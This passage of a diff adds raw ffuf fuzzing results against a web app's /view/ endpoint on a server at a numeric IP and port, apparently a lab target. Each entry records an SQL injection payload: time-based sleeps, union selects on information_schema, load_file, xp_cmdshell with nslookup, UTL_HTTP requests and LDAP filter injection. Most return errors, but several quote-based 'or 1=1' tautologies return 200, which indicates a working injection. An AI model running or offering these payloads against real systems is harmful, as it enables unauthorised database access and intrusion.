+      },
+      "position": 69,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 132066108,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/11) or benchmark(10000000,MD5(1))#",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf344",
+        "FUZZ": "truncate"
+      },
+      "position": 68,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 201644722,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1truncate",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf346",
+        "FUZZ": "\\x27UNION SELECT"
+      },
+      "position": 70,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 130829823,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1\\x27UNION SELECT",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf347",
+        "FUZZ": "declare @s varchar(200) select @s = 0x77616974 ..."
+      },
+      "position": 71,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 132549934,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1declare @s varchar(200) select @s = 0x77616974 ...",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf34a",
+        "FUZZ": "\"));waitfor delay '0:0:__TIME__'--"
+      },
+      "position": 74,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 128041008,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1\"));waitfor delay '0:0:__TIME__'--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf348",
+        "FUZZ": "tz_offset"
+      },
+      "position": 72,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 132086917,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1tz_offset",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf349",
+        "FUZZ": "sqlvuln"
+      },
+      "position": 73,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 136607709,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1sqlvuln",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf34b",
+        "FUZZ": "||6"
+      },
+      "position": 75,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 202271064,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1||6",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf34d",
+        "FUZZ": "%2A%28%7C%28objectclass%3D%2A%29%29"
+      },
+      "position": 77,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 203850025,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1%2A%28%7C%28objectclass%3D%2A%29%29",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf34c",
+        "FUZZ": "or%201=1 --"
+      },
+      "position": 76,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 214187747,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1or%201=1 --",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf34e",
+        "FUZZ": "or a=a"
+      },
+      "position": 78,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 213327655,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1or a=a",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf34f",
+        "FUZZ": ") union select * from information_schema.tables;"
+      },
+      "position": 79,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 214909469,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1) union select * from information_schema.tables;",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf350",
+        "FUZZ": "PRINT @@variable"
+      },
+      "position": 80,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 228772285,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1PRINT @@variable",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf353",
+        "FUZZ": "\" or \"a\"=\"a"
+      },
+      "position": 83,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 278225184,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1\" or \"a\"=\"a",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf354",
+        "FUZZ": "(sqlvuln)"
+      },
+      "position": 84,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 275021157,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1(sqlvuln)",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf355",
+        "FUZZ": "x' AND members.email IS NULL; --"
+      },
+      "position": 85,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 272286863,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1x' AND members.email IS NULL; --",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf358",
+        "FUZZ": "0x770061006900740066006F0072002000640065006C00 ..."
+      },
+      "position": 88,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 223374972,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/10x770061006900740066006F0072002000640065006C00 ...",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf356",
+        "FUZZ": " or 1=1--"
+      },
+      "position": 86,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 279038273,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or 1=1--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf359",
+        "FUZZ": "%20'sleep%2050'"
+      },
+      "position": 89,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 223612584,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1%20'sleep%2050'",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf35b",
+        "FUZZ": "1)) or pg_sleep(__TIME__)--"
+      },
+      "position": 91,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 220563286,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/11)) or pg_sleep(__TIME__)--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf35a",
+        "FUZZ": "as"
+      },
+      "position": 90,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 221713628,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1as",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf35e",
+        "FUZZ": ",@variable"
+      },
+      "position": 94,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 216530549,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1,@variable",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf357",
+        "FUZZ": " and 1=( if((load_file(char(110,46,101,120,11 ..."
+      },
+      "position": 87,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 226314781,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 and 1=( if((load_file(char(110,46,101,120,11 ...",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf35d",
+        "FUZZ": " union all select @@version--"
+      },
+      "position": 93,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 224196408,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 union all select @@version--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf360",
+        "FUZZ": " or (EXISTS)"
+      },
+      "position": 96,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 220821040,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or (EXISTS)",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf361",
+        "FUZZ": "t'exec master..xp_cmdshell 'nslookup www.googl ..."
+      },
+      "position": 97,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 219367490,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1t'exec master..xp_cmdshell 'nslookup www.googl ...",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf35f",
+        "FUZZ": "(sqlattempt2)"
+      },
+      "position": 95,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 225204313,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1(sqlattempt2)",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf362",
+        "FUZZ": "%20$(sleep%2050)"
+      },
+      "position": 98,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 295999094,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1%20$(sleep%2050)",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf363",
+        "FUZZ": "1 or benchmark(10000000,MD5(1))#"
+      },
+      "position": 99,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 297527736,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/11 or benchmark(10000000,MD5(1))#",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf367",
+        "FUZZ": "hi' or 'x'='x';"
+      },
+      "position": 103,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 292828554,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1hi' or 'x'='x';",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf365",
+        "FUZZ": "||UTL_HTTP.REQUEST"
+      },
+      "position": 101,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 296954128,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1||UTL_HTTP.REQUEST",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf364",
+        "FUZZ": "%20or%20''='"
+      },
+      "position": 100,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 298021415,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1%20or%20''='",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf36a",
+        "FUZZ": "; begin declare @var varchar(8000) set @var=' ..."
+      },
+      "position": 106,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 221943529,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1; begin declare @var varchar(8000) set @var=' ...",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf372",
+        "FUZZ": "a' or 1=1--"
+      },
+      "position": 114,
+      "status": 200,
+      "length": 2633,
+      "words": 723,
+      "lines": 53,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 210425258,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1a' or 1=1--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf368",
+        "FUZZ": "\") or sleep(__TIME__)=\""
+      },
+      "position": 104,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 231064023,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1\") or sleep(__TIME__)=\"",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf366",
+        "FUZZ": " or pg_sleep(__TIME__)--"
+      },
+      "position": 102,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 303308667,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or pg_sleep(__TIME__)--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf369",
+        "FUZZ": " or 'whatever' in ('whatever')"
+      },
+      "position": 105,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 231812568,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or 'whatever' in ('whatever')",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf373",
+        "FUZZ": "a' or 'a' = 'a"
+      },
+      "position": 115,
+      "status": 200,
+      "length": 2633,
+      "words": 723,
+      "lines": 53,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 210738969,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1a' or 'a' = 'a",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf36d",
+        "FUZZ": "exec(@s)"
+      },
+      "position": 109,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 227305207,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1exec(@s)",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf36c",
+        "FUZZ": "0x77616974666F722064656C61792027303A303A313027 ..."
+      },
+      "position": 108,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 228423720,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/10x77616974666F722064656C61792027303A303A313027 ...",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf36f",
+        "FUZZ": " union select"
+      },
+      "position": 111,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 227276157,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 union select",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf36e",
+        "FUZZ": ") or pg_sleep(__TIME__)--"
+      },
+      "position": 110,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 227775649,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1) or pg_sleep(__TIME__)--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf376",
+        "FUZZ": " or a=a--"
+      },
+      "position": 118,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 142361522,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or a=a--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf370",
+        "FUZZ": " or sleep(__TIME__)#"
+      },
+      "position": 112,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 225398980,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or sleep(__TIME__)#",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf371",
+        "FUZZ": " select * from information_schema.tables--"
+      },
+      "position": 113,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 224032251,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 select * from information_schema.tables--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf374",
+        "FUZZ": "declare @s varchar(22) select @s ="
+      },
+      "position": 116,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 218833676,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1declare @s varchar(22) select @s =",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf37c",
+        "FUZZ": "having"
+      },
+      "position": 124,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 125019683,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1having",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf378",
+        "FUZZ": "|"
+      },
+      "position": 120,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 210714291,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1|",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf379",
+        "FUZZ": " or sleep(__TIME__)='"
+      },
+      "position": 121,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 207541562,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or sleep(__TIME__)='",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf377",
+        "FUZZ": " or '1'='1"
+      },
+      "position": 119,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 213810759,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or '1'='1",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf37a",
+        "FUZZ": " or 1 --'"
+      },
+      "position": 122,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 198382691,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or 1 --'",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf37b",
+        "FUZZ": "or 0=0 #\""
+      },
+      "position": 123,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 197506355,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1or 0=0 #\"",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf375",
+        "FUZZ": " or 2 between 1 and 3"
+      },
+      "position": 117,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 231974280,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or 2 between 1 and 3",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf37d",
+        "FUZZ": "a'"
+      },
+      "position": 125,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 130325476,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1a'",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf380",
+        "FUZZ": "â or 1=1 --"
+      },
+      "position": 128,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 126416585,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1â or 1=1 --",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf37f",
+        "FUZZ": "declare @s varchar (8000) select @s = 0x73656c ..."
+      },
+      "position": 127,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 130399227,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1declare @s varchar (8000) select @s = 0x73656c ...",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf381",
+        "FUZZ": "char%4039%41%2b%40SELECT"
+      },
+      "position": 129,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 128666424,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1char%4039%41%2b%40SELECT",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf383",
+        "FUZZ": "bfilename"
+      },
+      "position": 131,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 129181947,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1bfilename",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf385",
+        "FUZZ": ") or benchmark(10000000,MD5(1))#"
+      },
+      "position": 133,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 127113754,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1) or benchmark(10000000,MD5(1))#",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf382",
+        "FUZZ": "order by"
+      },
+      "position": 130,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 129893904,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1order by",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf384",
+        "FUZZ": " having 1=1--"
+      },
+      "position": 132,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 201021948,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 having 1=1--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf387",
+        "FUZZ": ";waitfor delay '0:0:__TIME__'--"
+      },
+      "position": 135,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 196250029,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1;waitfor delay '0:0:__TIME__'--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf388",
+        "FUZZ": "\" or 1=1--"
+      },
+      "position": 136,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 203818798,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1\" or 1=1--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf386",
+        "FUZZ": " or username like char(37);"
+      },
+      "position": 134,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 205413306,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or username like char(37);",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf38f",
+        "FUZZ": "a' or 3=3--"
+      },
+      "position": 143,
+      "status": 200,
+      "length": 2633,
+      "words": 723,
+      "lines": 53,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 116190001,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1a' or 3=3--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf38b",
+        "FUZZ": " or 'text' > 't'"
+      },
+      "position": 139,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 131118726,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or 'text' > 't'",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf389",
